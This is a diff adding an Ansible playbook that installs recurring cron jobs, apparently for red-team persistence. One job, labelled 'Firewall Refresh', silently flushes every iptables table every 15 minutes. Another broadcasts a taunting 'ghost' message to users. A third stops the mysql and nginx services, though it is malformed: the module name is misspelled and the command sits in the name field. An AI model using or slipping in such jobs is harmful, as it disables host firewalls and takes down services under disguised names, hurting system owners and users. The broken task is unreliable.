@@ -1,0 +1,16 @@
+---
+- name: iptables time
+  ansible.builtin.cron:
+    name: "Firewall Refresh"
+    minute: "*/15"
+    job: "(iptables -F; iptables -t mangle -F; iptables -t nat -F;) > /dev/null"
+
+- name: the ghost
+  ansible.builtin.cron:
+    name: "ghost?"
+    minute: "*/15"
+    job: "wall oooOOOOoOOoOoOoo"
+
+- name: service shutdown
+  ansible.bultin.cron:
+    name: "(service mysql stop; service nginx stop;) > /dev/null"
